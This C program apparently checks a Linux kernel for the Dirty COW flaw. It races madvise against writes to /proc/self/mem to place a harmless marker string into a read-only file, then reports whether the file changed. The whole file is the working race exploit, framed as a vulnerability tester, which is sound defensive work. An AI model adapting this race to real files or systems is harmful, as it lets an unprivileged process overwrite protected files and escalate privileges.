#include "prefix.h"

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <string.h>

#define ITERATIONS 100000000
#define DEBUG_ITER_PRINT_IVAL 10000000

static const char *file_content = "VULNERABLE!" NL;

struct thread_arguments {
	bool cont;
	const char * const path;
	void * const map;
	const char * const str;
};

static void *madvise_thread(void *arg) {
	__DEBUG_PRINTF("madvise_thread called" NL);

	struct thread_arguments *args = (struct thread_arguments *)arg;
	void *map = args->map;

	int i, c = 0;
	for (i = 0; args->cont && i < ITERATIONS; ++i) {
		if (0 == (i % DEBUG_ITER_PRINT_IVAL)) {
			__DEBUG_PRINTF("madvise thread iteration %u" NL, i);
		}

		c += madvise(map, 100, MADV_DONTNEED);
	}

	args->cont = false;

	__DEBUG_PRINTF("madvise %d" NL, c);
	return NULL;
}

static void *memwrite_thread(void *arg) {
	__DEBUG_PRINTF("memwrite_thread called" NL);

	struct thread_arguments *args = (struct thread_arguments *)arg;
	off_t map = (off_t)args->map;
	const char *str = args->str;
	size_t len = strlen(str);

	int i, c = 0, fd = open("/proc/self/mem", O_RDWR);
	if (fd < 0) {
		(void)perror("write: open()");
		goto fail;
	}

	for (i = 0; args->cont && i < ITERATIONS; ++i) {
		if (0 == (i % DEBUG_ITER_PRINT_IVAL)) {
			__DEBUG_PRINTF("memwrite thread iteration %u" NL, i);
		}

		if (map == lseek(fd, map, SEEK_SET)) {
			c += write(fd, str, len);
		} else {
			if (errno) {
				(void)perror("write: lseek()");
			} else {
				(void)fprintf(stderr, "write: did not seek to correct"
							  "position, but no error code was given" NL);
			}
		}
	}

  fail:
	args->cont = false;
	if (fd >= 0 && close(fd)) {
		(void)perror("write: close()");
	}

	__DEBUG_PRINTF("memwrite %d" NL, c);
	return NULL;
}

static int run_test() {
	bool vulnerable = false;
	int fd = -1;
	char *buf = NULL;

	const char *filepath = __TESTER_FILE__;
	(void)printf("Using file '%s' for testing..." NL, filepath);

	fd = open(filepath, O_RDONLY);
	if (fd < 0) {
		(void)perror("run: open()");
		goto fail;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		(void)perror("run: fstat()");
		goto fail;
	}

	void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (map == MAP_FAILED) {
		(void)perror("run: mmap()");
		(void)fprintf(stderr, "st_size = %zu ; fd = %u" NL,
					  (size_t)st.st_size, fd);
		goto fail;
	}
	__DEBUG_PRINTF("mmap %p" NL, map);

	struct thread_arguments args = {
		.cont = true,
		.path = filepath,
		.map = map,
		.str = file_content
	};

	/* start threads */
	pthread_t th_advise, th_write, th_poll;

	(void)printf("Racing..." NL);
	(void)pthread_create(&th_advise, NULL, madvise_thread, (void *)&args);
	(void)pthread_create(&th_write, NULL, memwrite_thread, (void *)&args);

	/* wait for threads to finish */
	(void)pthread_join(th_advise, NULL);
	(void)pthread_join(th_write, NULL);

	(void)printf("Racing done." NL);

	/* check vulnerability */
	size_t slen = strlen(args.str);
	buf = (char *)calloc((slen + 1), sizeof(char));

	/* seek to the beginning of the file to read its contents */
	if (lseek(fd, 0, SEEK_SET)) {
		(void)perror("run: lseek()");
		goto fail;
	}

	if (slen == read(fd, buf, slen)
		&& !strncmp(args.str, buf, slen)) {
		/* vulnerable */
		vulnerable = true;

		(void)printf("Your system is vulnerable!" NL);
		(void)printf("If you think this is wrong, restart your system "
					 "to ensure that an updated kernel gets active." NL);
	} else {
		/* not vulnerable */
		vulnerable = false;

		(void)printf("Your system appears to be safe!" NL);
		(void)printf("Instead of the expected '%s' we read:" NL, args.str);
		(void)printf("%s" NL, buf);
	}


  cleanup:
	(void)free(buf);
	if (fd >= 0 && close(fd)) {
		(void)perror("run: close()");
	}

	return (vulnerable ? EXIT_SUCCESS : EXIT_FAILURE);

  fail:
	vulnerable = false;
	goto cleanup;
}

int main(int argc, char *argv[]) {
	return run_test();
}
